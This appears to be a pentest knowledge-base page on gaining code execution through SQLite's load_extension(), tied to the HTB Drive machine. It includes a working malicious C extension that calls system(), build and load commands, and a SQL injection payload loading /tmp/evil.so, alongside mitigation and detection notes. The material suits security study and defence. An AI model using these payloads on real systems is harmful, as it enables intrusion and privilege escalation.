---
topic: SQLite — loading extensions and code execution
tags: [linux, sqlite, load-extension, rce, privesc]
---

# SQLite — loading extensions and code execution

[🌐 Español](sqlite-load-extension.md) | **English**

## Concept

SQLite can load shared libraries as extensions through `load_extension()`. The extension exports an initialisation function that registers SQL functions; if that initialisation runs commands, a SQL query becomes code execution. The feature is disabled by default, but some applications, drivers or builds enable it.

## When it applies

- SQLite with `load_extension()` enabled (`sqlite3_enable_load_extension`).
- SQL injection able to stack queries (`;`) or control a full query.
- Ability to write a `.so` to a path the process can read.
- The SQLite process runs as a privileged user or has access to secrets.
- On Drive, the setuid client allowed loading an extension from a controlled path.

## Procedure

1. Check whether `load_extension` is available:
   ```sql
   SELECT load_extension('/tmp/missing.so');
   ```
   A "not authorized" error means it is disabled; a file error means it tried to load it.
2. Compile an extension with an initialisation function.
3. Write the `.so` to `/tmp`, `/dev/shm` or the service working directory.
4. Invoke it through SQL or injection.
5. Verify execution (`id > /tmp/out`).

## Commands

```c
#include <sqlite3ext.h>
SQLITE_EXTENSION_INIT1
#include <stdlib.h>

int sqlite3_extension_init(sqlite3 *db, char **pzErrMsg,
                           const sqlite3_api_routines *pApi) {
    SQLITE_EXTENSION_INIT2(pApi);
    system("id > /tmp/sqlite_rce");
    return 0;
}
```

```bash
gcc -shared -fPIC -o evil.so evil.c
sqlite3 target.db "SELECT load_extension('/tmp/evil.so');"
```

```python
import sqlite3
con = sqlite3.connect('target.db')
con.enable_load_extension(True)
con.load_extension('/tmp/evil.so')
```

Through injection:

```sql
1'; SELECT load_extension('/tmp/evil.so');--
```

## Variants

- Different entry point: `sqlite3_<name>_init` when calling `load_extension('/tmp/evil.so', 'name')`.
- Python, Node or PHP extensions using the driver API.
- Load a legitimate extension from a writable path to hijack the load.
- Use `ATTACH DATABASE` or `VACUUM INTO` to write files before loading.

## Limitations

- `load_extension` is disabled in most builds.
- SQLite does not allow multiple statements per `execute()` in many drivers; you need `executescript` or a vulnerable query.
- The `.so` must match the architecture and SQLite version.
- SELinux, AppArmor or a `noexec` directory blocks the load.

## Mitigation

- Keep `load_extension` disabled and never call `sqlite3_enable_load_extension`.
- Parameterise queries and avoid dynamic SQL.
- Run the service as an unprivileged user without access to writable paths.
- Mount `/tmp` with `noexec` and audit extension loading.

## Detection

- `load_extension` calls in queries or logs.
- `.so` files created in temporary directories.
- SQLite processes loading libraries outside expected paths.
- `system`, `popen` or `execve` writes from the database process.

## References

- [SQLite — Loadable extensions](https://www.sqlite.org/loadext.html)
- [SQLite — `load_extension`](https://www.sqlite.org/lang_corefunc.html#load_extension)
- [0xdf — Drive](https://0xdf.gitlab.io/2023/07/15/htb-drive.html)
- [Drive writeup](../../machines/linux/drive/README.en.md)
